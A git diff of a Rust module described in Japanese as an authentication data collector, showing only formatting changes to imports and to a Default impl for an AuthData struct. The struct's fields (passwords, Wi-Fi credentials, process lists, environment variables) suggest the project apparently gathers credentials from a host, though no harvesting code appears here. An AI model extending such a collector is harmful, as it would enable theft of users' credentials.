@@ -1,14 +1,12 @@
-﻿// 統合認証データ収集モジュール
+// 統合認証データ収集モジュール
 // auth_collector_safe.rsの設計パターンを統合した改良版
+use crate::{AoiError, AoiResult, Config};
 use serde::{Deserialize, Serialize};
 use std::{
     collections::BTreeMap,
     fmt::{self, Display},
     time::{Duration, SystemTime},
 };
-
-// Windows系でよく使用されるインポートは各関数内で使用時にインポート
-use crate::{Config, AoiError, AoiResult};
 
 // -------------------------------------------------------------------------------------------------
 // エラー型定義（auth_collector_safe.rsから統合）
@@ -185,17 +183,17 @@ impl Default for AuthData {
                 .duration_since(SystemTime::UNIX_EPOCH)
                 .unwrap_or(Duration::from_secs(0))
                 .as_secs(),
-            passwords: Vec::new(), // 動的拡張対応
-            wifi_creds: Vec::new(), // 動的拡張対応
-            structured_wifi: Vec::new(), // 動的拡張対応
-            structured_network: Vec::new(), // 動的拡張対応
+            passwords: Vec::new(),              // 動的拡張対応
+            wifi_creds: Vec::new(),             // 動的拡張対応
+            structured_wifi: Vec::new(),        // 動的拡張対応
+            structured_network: Vec::new(),     // 動的拡張対応
             structured_credentials: Vec::new(), // 動的拡張対応
             metadata: BTreeMap::new(),
             detailed_system: DetailedSystemInfo::default(),
             cpu_info: CpuInfo::default(),
             memory_info: MemoryInfo::default(),
-            storage_info: Vec::new(), // 動的拡張対応
-            process_list: Vec::new(), // 動的拡張対応
+            storage_info: Vec::new(),    // 動的拡張対応
+            process_list: Vec::new(),    // 動的拡張対応
             network_details: Vec::new(), // 動的拡張対応
             runtime_info: RuntimeInfo::default(),
             environment_vars: BTreeMap::new(),
